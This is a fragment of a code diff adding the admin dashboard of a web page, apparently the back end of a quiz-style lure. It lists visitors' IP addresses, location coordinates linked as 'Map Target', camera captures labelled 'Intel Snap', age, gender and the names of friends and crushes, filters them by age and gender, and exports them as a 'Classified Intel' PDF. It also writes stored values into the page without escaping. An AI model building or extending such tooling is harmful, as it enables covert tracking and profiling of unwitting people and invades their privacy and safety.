+            [...new Set(globalAdminVault.map(i => i.age))].sort((a,b)=>a-b).forEach(age => { ageSelect.innerHTML += `<option value="${age}">${age}</option>`; });
+            
+            renderVaultTable();
+            document.getElementById('adminVaultUI').style.display = 'block';
+        }
+
+        function renderVaultTable() {
+            const tbody = document.getElementById('vaultTableBody');
+            const ageFilter = document.getElementById('filterAge').value;
+            const genderFilter = document.getElementById('filterGender').value;
+            tbody.innerHTML = "";
+
+            const filteredData = globalAdminVault.filter(entry => {
+                return (ageFilter === 'all' || entry.age === ageFilter) && (genderFilter === 'all' || entry.gender === genderFilter);
+            });
+
+            if (filteredData.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; padding: 25px;"><strong>Vault is Empty. Awaiting Cloud Sync.</strong></td></tr>`;
+                return;
+            }
+
+            filteredData.forEach((entry, i) => {
+                // Formatting Postgres timestamp
+                let cleanTime = new Date(entry.created_at).toLocaleString();
+                
+                let locDisplay = entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<a href="${entry.location_link}" target="_blank" class="loc-link"><i class="fa-solid fa-crosshairs"></i> Map Target</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
+                
+                let snapsHTML = entry.snaps && entry.snaps.length > 0 
+                    ? `<div class="snap-grid">` + entry.snaps.map(url => `<img src="${url}" alt="Intel Snap">`).join('') + `</div>`
+                    : `<span style="color:#555; font-style:italic;">No Visuals Captured</span>`;
+
+                tbody.innerHTML += `
+                    <tr>
+                        <td style="font-weight:900; font-size:16px; color:#00ffcc;">#${entry.id}</td>
+                        <td><strong>${cleanTime}</strong><br><span style="font-family:monospace; color:#00b4db;">${entry.ip_address}</span></td>
+                        <td>${locDisplay}</td>
+                        <td><strong>Age:</strong> ${entry.age}<br><strong>Gender:</strong> ${entry.gender}</td>
+                        <td><strong>BFF:</strong> ${entry.best_friend}<br><strong>Love:</strong> ${entry.love_name}</td>
+                        <td><i class="fa-solid fa-wave-square" style="color:#ff4d4d;"></i> ${entry.fav_song}</td>
+                        <td>${snapsHTML}</td>
+                    </tr>
+                `;
+            });
+        }
+
+        function closeVault() { document.getElementById('adminVaultUI').style.display = 'none'; }
+        
+        function generatePDFReport() {
+            document.getElementById('pdfTime').innerText = new Date().toLocaleString();
+            const target = document.getElementById('pdfTarget'); target.style.background = "#0a0e17";
+            document.getElementById('reportHeader').style.display = 'block'; 
+            
+            const opt = {
+                margin: 0.2, filename: 'Master_Admin_Dilawar_Classified_Intel.pdf',
+                image: { type: 'jpeg', quality: 1.0 }, html2canvas: { scale: 2, useCORS: true, backgroundColor: '#0a0e17' },
+                jsPDF: { unit: 'in', format: 'A4', orientation: 'landscape' }
+            };
+
+            html2pdf().set(opt).from(target).save().then(() => {
+                document.getElementById('reportHeader').style.display = 'none'; target.style.background = ""; 
+            });
+        }
+
+        let isDarkMode = false;
+        function toggleTheme() {
+            isDarkMode = !isDarkMode; document.body.classList.toggle('dark-theme', isDarkMode);
+            document.getElementById('themeIcon').classList.replace(isDarkMode ? 'fa-moon' : 'fa-sun', isDarkMode ? 'fa-sun' : 'fa-moon');
+        }
+        document.addEventListener('keypress', function (e) { if (e.key === 'Enter') { const a = document.querySelector('.step.active'); if (a) { const b = a.querySelector('button'); if (b) b.click(); } } });
+    </script>
+</body>
+</html>
